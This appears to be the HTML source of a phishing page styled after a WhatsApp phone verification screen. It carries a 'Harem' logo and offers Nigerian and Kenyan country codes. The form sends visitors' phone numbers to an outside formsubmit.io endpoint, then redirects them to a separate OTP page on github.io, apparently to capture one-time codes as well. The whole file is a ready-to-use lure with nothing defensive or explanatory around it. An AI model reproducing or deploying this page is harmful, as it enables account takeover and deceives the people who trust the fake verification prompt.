<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        /* Reset some default browser styles */
        body, h2, p, input, select, button, option {
            margin: 0;
            padding: 0;
            font-family: "Times New Roman", Times, serif;
        }

        /* Apply WhatsApp-like background color */
        body {
            background-image: url('images/CYCLE4.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }

        /* Style the WhatsApp container */
        .whatsapp-container {
            background-color: rgba(255, 77, 77, 0.2);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 100%;
        }

        /* Style the page title */
        h2 {
            font-size: 18px;
            background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            margin-bottom: 15px;
            -webkit-background-clip: text;
            color: transparent;
        }

        /* Style the message */
        p {
            font-size: 14.5px;
            margin-bottom: 20px;
            color: white;
        }

        /* Style the phone input container */
        .phone-input {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
        }

        /* Style the country code input field */
        .country-code {
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
            padding: 10px;
            padding-left: 6px;
            margin-bottom: 10px;
            width: 25%;
            outline: none;
            border-radius: 30px;
            background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            margin-bottom: 15px;
        }

        /* Style the rest of the phone number input field */
        #phoneNumber {
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
            padding: 10px;
            margin-bottom: 10px;
            width: 45%;
            outline: none;
            color: white;
            background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            border-radius: 25px;
        }

        /* Style the OTP button */
        #otpButton {
            background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            color: #fff;
            font-size: 15px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }

        /* Hover effect for OTP button */
        #otpButton:hover {
            background-color: #128c7e;
        }

        .logo-container {
            margin: 0 auto;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 80px;
            background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            padding: 0% 10px;
            opacity: 0.6;
            display: block;
        }

        .logo {
            width: 50px;
            background-color: linear-gradient(45deg, #ff4d4d, #ffb6c1);
            border-radius: 100000000000000000px;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="casalogo.png" alt="Harem Logo" class="logo">
    </div>

    <div class="whatsapp-container">
        <h2>Verify Your Phone Number</h2>
        <p>Input phone number to receive OTP verification:</p>
        
        <form id="contactform" class="phone-input" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
            <input name="_redirect" type="hidden" value="https://tzmyn.github.io/Harem/OTP.html">
            <input type="hidden" name="_captcha" value="false">
            <select class="country-code" name="countryCode" required>
                <option value="" disabled selected>Select Country Code</option>
                <option value="+234">(+234) NIG</option>
                <option value="+254">(+254) KEN</option>
                <!-- Add more country codes as needed -->
            </select>
            <input type="tel" name="phoneNumber" id="phoneNumber" placeholder="Phone Number" required pattern="[0-9]*" minlength="10">
            <button id="otpButton" type="submit">OTP VERIFICATION</button>
        </form>
    </div>

    <script>
        // JavaScript to handle the OTP button click event
        const otpButton = document.getElementById('otpButton');
        otpButton.addEventListener('click', function () {
            window.location.href = 'https://tzmyn.github.io/Harem/OTP.html'; // Redirect to OTP page
        });
    </script>

    <script>
        document.getElementById("contactform").addEventListener("submit", function (event) {
            const countryCode = document.querySelector(".country-code").value;
            const phoneNumber = document.querySelector("input[name='phoneNumber']").value;

            if (countryCode === "" || phoneNumber === "") {
                alert("Please fill in all required fields.");
                event.preventDefault(); // Prevent form submission
            }
        });
    </script>
</body>
</html>
